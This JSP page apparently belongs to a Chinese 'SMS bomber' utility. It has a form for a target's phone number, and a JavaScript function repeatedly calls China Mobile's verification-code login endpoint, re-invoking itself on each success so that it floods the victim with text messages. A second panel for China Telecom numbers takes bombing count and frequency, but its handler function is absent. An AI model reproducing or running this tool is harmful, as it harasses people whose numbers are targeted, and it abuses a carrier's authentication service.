<%@ page language="java" import="java.util.*" pageEncoding="utf-8"%>
   <!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<!--bootstrap table css-->
<!--  
  <form action="https://login.10086.cn/sendRandomCodeAction.action">
							<input id="userName" type="text" name="userName"
								placeholder="要轰炸的手机号"> <input id="type" type="text"
								name="type"> <input id="channelID" type="text"
								name="channelID"> <input type="submit" value="轰炸">
						</form>-->
<script type="text/javascript">

function cmstart(){
	var username = document.getElementById('userName').value;

	$.ajax({
		type : "GET",
		url : "https://login.10086.cn/sendRandomCodeAction.action",
		data : {userName:username,type:01,channelID:12027}, 
		success : function(data) {
			alert("success");
			cmstart();
		},
		error : function(data) {
			alert(JSON.stringify(data));
		}
	});	
}
</script>
</head>

<body>
	<section class="content-header">
      <h1>
        工具集合
        <small>预览</small>
      </h1>
      <ol class="breadcrumb">
        <li><a href="#"><i class="fa fa-dashboard"></i> 主界面</a></li>
        <li><a href="#">实用工具</a></li>
        <li class="active">General Elements</li>
      </ol>
    </section>

<section class="content">
		<div class="row">
			<!-- left column -->
			<div class="col-md-6">
				<!-- general form elements -->
				<div class="box box-primary">
					<div class="box-header with-border">
						<h3 class="box-title">移动电话短信轰炸机测试版</h3>
					</div>
					<!-- /.box-header -->
					<!-- form start -->
					<div class="box-body">
						<div class="form-group">
							<label for="exampleInputEmail1">手机号</label> <input type="text"
								class="form-control" id="userName" placeholder="需要轰炸的手机号">
						</div>
						<div class="form-group">
							<label for="exampleInputPassword1">类型</label> <input type="text"
								class="form-control" id="type" placeholder="类型不用填" value = "01">
						</div>
						<div class="form-group">
							<label for="exampleInputPassword1">ChannelID</label> <input
								type="text" class="form-control" id="channelID" value = "12027"
								placeholder="频道ID不用填">
						</div>
					</div>
					<!-- /.box-body -->

					<div class="box-footer">
						<button type="button" class="btn btn-primary" onclick="cmstart()">开始轰炸</button>
					</div>
				</div>
			</div>
			<!-- /.box-body -->

		<!-- right column -->
        <div class="col-md-6">
          <div class="box box-success">
            <div class="box-header with-border">
              <h3 class="box-title">电信电话短信轰炸机测试版</h3>
            </div>
            <!-- /.box-header -->
            <!-- form start -->
              <div class="box-body">
                <div class="form-group">
                  <label for="exampleInputEmail1">手机号</label>
                  <input type="text" class="form-control" id="ctnumber" placeholder="需要轰炸的手机号">
                </div>
                <div class="form-group">
                  <label for="exampleInputPassword1">轰炸次数</label>
                  <input type="text" class="form-control" id="ctcount" placeholder="类型不用填">
                </div>    
                <div class="form-group">
                  <label for="exampleInputPassword1">频率</label>
                  <input type="text" class="form-control" id="ctfrequency" placeholder="频道ID不用填">
                </div>                      
              </div>
              <!-- /.box-body -->

              <div class="box-footer">
                <button type="button" class="btn btn-primary" onclick="ctstart()">开始轰炸</button>
              </div>
          </div>
            </div>
            <!-- /.box-body -->
          </div>
          <!-- /.box -->
        </div>
        <!--/.col (right) -->
        
        
        </div>
    </section>



</body>

